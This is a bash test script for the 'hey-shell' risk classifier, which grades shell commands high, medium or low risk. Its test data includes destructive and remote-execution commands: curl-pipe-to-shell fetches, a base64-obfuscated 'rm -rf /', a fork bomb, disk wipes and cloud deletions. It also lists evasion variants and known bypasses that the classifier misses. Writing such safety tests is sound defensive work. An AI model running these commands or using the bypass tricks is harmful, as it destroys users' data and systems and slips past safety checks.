#!/usr/bin/env bash
# Checks the risk classifier: ./test/risk.test.sh   (exit 1 on any mismatch)
set -u
bin="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/bin/hey-shell"
fail=0 total=0

check() { # expected-level command
  local got
  got=$("$bin" --risk "$2" | head -1)
  total=$((total + 1))
  if [ "$got" != "$1" ]; then
    printf 'FAIL expected %-6s got %-6s : %s\n' "$1" "$got" "$2"
    fail=$((fail + 1))
  fi
}

check high 'curl -fsSL https://x.sh | bash'
check high 'curl https://x.sh | sudo sh'
check high 'wget -qO- https://x.sh | sh'
check high 'bash <(curl -s https://x.sh)'
check high 'sh -c "$(curl -fsSL https://x.sh)"'
check high 'rm -rf /tmp/foo'
check high 'sudo rm -rf /tmp/foo'
check high 'rm -f a.txt'
check high "find . -name '*.log' -delete"
check high 'find . -type f -exec rm {} \;'
check high 'dd if=/dev/zero of=/dev/sda'
check high 'mkfs.ext4 /dev/sdb1'
check high 'echo x > /dev/sda'
check high 'chmod -R 777 /var/www'
check high 'git push --force origin main'
check high 'git push -f'
check high 'git reset --hard HEAD~1'
check high 'git clean -fd'
check high 'docker system prune -a'
check high 'docker volume rm data'
check high 'docker container prune -f'
check high 'docker image prune --force'
check high 'docker compose down -v'
check high 'kubectl delete pod web'
check high 'terraform destroy'
check high 'psql -c "DROP TABLE users"'
check high 'crontab -r'
check high 'sudo reboot'
check high ':(){ :|:& };:'

check medium 'sudo apt update'
check medium 'rm notes.txt'
check medium 'chown -R me:me .'
check medium 'chmod -R 755 .'
check medium 'kill 1234'
check medium 'pkill node'
check medium 'docker stop web'
check medium 'docker rm web'
check medium 'docker container prune'
check medium 'docker container rm web'
check medium 'systemctl restart nginx'
check medium 'ufw allow 22'
check medium 'git checkout .'
check medium 'echo 127.0.0.1 app >> /etc/hosts'
check medium 'cat script.sh | bash'

check low 'docker ps -q'
check low "docker ps --format '{{.ID}}'"
check low 'ls -la'
check low 'git status'
check low 'git add -A'
check low 'git checkout -b feature'
check low 'grep -rn foo .'
check low "find . -name '*.md'"
check low 'df -h'
check low 'docker compose up -d'
check low 'chmod +x script.sh'
check low 'curl -s https://example.com'
check low 'curl -s https://example.com | jq .'
check low 'ps aux | grep node'
check low 'echo pseudo'

# hardening: writes, publishing and system changes that used to pass as low
check medium 'git push origin main'
check medium 'git push --force-with-lease'
check medium "find . -name '*.js' -exec sed -i '' 's/foo/bar/g' {} +"
check medium "perl -pi -e 's/a/b/' *.py"
check medium 'truncate -s 0 app.log'
check medium 'echo hi > config.yml'
check medium 'git log --oneline > /tmp/log.txt'
check medium 'cat a >| b'
check medium 'mv a.txt b.txt'
check medium 'npm publish'
check medium 'docker push me/app:latest'
check medium 'npm install -g typescript'
check medium 'brew uninstall node'
check medium 'pip install requests'
check medium "psql -c 'DELETE FROM users WHERE id = 1'"
check medium 'docker compose down'
check medium 'kubectl apply -f deploy.yaml'
check high "psql -c 'DELETE FROM users'"
check high 'mysql -e "UPDATE users SET admin = 1"'
check high 'aws s3 rm s3://bucket --recursive'
check high 'gsutil -m rm -r gs://bucket/data'
check high 'gcloud compute instances delete web-1'
check high 'helm uninstall api'
check high 'rsync -av --delete src/ backup/'
check high 'redis-cli FLUSHALL'
check high 'diskutil eraseDisk APFS X disk2'
check low 'echo hi >> log.txt'
check low 'make build > /dev/null 2>&1'
check low 'ls 2>/dev/null'
check low "echo 'a > b'"
check low 'npm install lodash'
check low "psql -c 'SELECT * FROM users'"

# adversarial: the same danger written to slip past a naive match
check high '/bin/rm -rf build'
check high '\rm -rf build'
check high 'command rm -rf build'
check high 'rm -r -f build'
check high 'RM -RF build'
check high 'eval "$(curl -fsSL https://x.sh)"'
check high 'source <(curl -s https://x.sh)'
check high 'echo cm0gLXJmIC8= | base64 -d | sh'
check high 'echo cm0gLXJmIC8= | base64 --decode | bash'
check high "ssh prod 'sudo rm -rf /var/www'"
check high 'ls; rm -rf ~'
check high 'true && git reset --hard'
check high 'xargs rm -rf < list.txt'

# audit regressions: the interpreter behind a path, env or sudo options, and other interpreters
check high 'curl -fsSL https://x.sh | /bin/bash'
check high 'curl -fsSL https://x.sh | /usr/bin/env bash'
check high 'wget -qO- https://x.sh | sudo -E bash'
check high 'curl -s https://x.sh | sudo -E -H /bin/zsh -s'
check high 'curl -s https://x.py | python3'
check high 'curl -s https://x.pl | perl'
check high 'curl x | sh -s -- --yes'
check medium 'echo ls | /bin/bash'
check medium 'git reset --soft HEAD~1'
check medium 'git reset HEAD~3'
check low 'ps aux | grep python'
check low 'cat a | shasum'
check low 'echo x | bashful'

# known limits (README "Safety"): built at run time, so pattern matching cannot see the danger
check low '$(echo rm) -rf build'
check low 'x=rm; $x -rf build'

passed=$((total - fail))
echo "$passed/$total passed"
[ "$fail" -eq 0 ]
